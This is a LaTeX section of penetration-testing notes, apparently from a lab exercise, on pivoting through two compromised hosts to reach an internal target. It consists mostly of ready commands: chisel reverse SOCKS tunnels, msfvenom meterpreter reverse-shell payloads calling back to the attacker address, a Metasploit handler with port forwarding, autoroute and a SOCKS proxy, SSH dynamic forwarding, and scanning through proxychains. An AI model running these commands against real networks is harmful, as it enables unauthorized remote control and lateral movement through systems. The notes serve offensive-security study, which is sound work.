

\section{Double Pivoting}

\subsection{With chisel}
Possible to n-pivot by extending the following principle
\url{https://ap3x.github.io/posts/pivoting-with-chisel/}

\begin{itemize}
        \item attacker : 10.10.16.11
        \item p1: 10.129.203.114 / 172.16.8.120
        \item p2: 172.16.8.3 / 172.16.9.3
        \item target: 172.16.9.25
\end{itemize}

\subsubsection{Step one}
\begin{itemize}
        \item attacker :  \verb+chisel server -p 4444 --reverse+
        \item pivot 1: 
            \verb+./chisel_1.7.7_linux_386 client 10.10.16.11:4444 R:1080:socks+
\end{itemize}


\subsubsection{Step two}
\begin{itemize}
    \item p1: \verb+./chisel_1.7.7_linux_386 server -p 5555 --reverse+
    \item p2: 
        \verb+\chisel_1.7.7_windows_amd64.exe client 172.16.8.120:5555  R:2080:socks+
\end{itemize}

\subsubsection{Step three}
edit \verb+/etc/proxychains.conf+
\begin{verbatim}
socks5 	127.0.0.1 1080
socks5 	127.0.0.1 2080
\end{verbatim}

then:
\verb+proxychains ssh x@172.16.9.25+


\subsection{With metasploit}
Same scenario as before. P1 and P2 will reverse with meterpreter
\begin{verbatim}
# for P1
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.11 LPORT=4444 -f elf > shell.elf
#for P2

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell2.exe LPORT=1234
\end{verbatim}


 \begin{verbatim}
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
 set lhost 10.10.16.11
 set LPORT 4444
 exploit

 (Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.16.11
 [*] Local TCP relay created: 10.10.14.15:8443 <-> :1234
 (Meterpreter 1)(/root) > bg

 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 0.0.0.0
 set LPORT 8443
 exploit


 (Meterpreter 2)(C:\) > run autoroute -s 172.16.9.0/23
 (Meterpreter 2)(C:\) > background
 route print

 use auxiliary/server/socks_proxy
 set srvport 9050
 set version 4a
 run
 \end{verbatim}
Edit the \verb+/etc/proxychains.conf+ file to use port \verb+9050+

\verb+proxychains nmap -sT -p 22 172.16.9.25+

\subsection{double pivoting using ssh}
\begin{verbatim}
# Pivot 1 using proxychains
ssh -D 1080 user@IP_Network1

# Configure /etc/proxychains to set port 1080
# Pivot 2 using proxychains
proxychains ssh -D 1081 user@IP_Network2

# Configure /etc/proxychains to set port 1081

proxychains nmap...
\end{verbatim}

\subsection{Tunneling with Chisel and SSF}

\url{https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html}
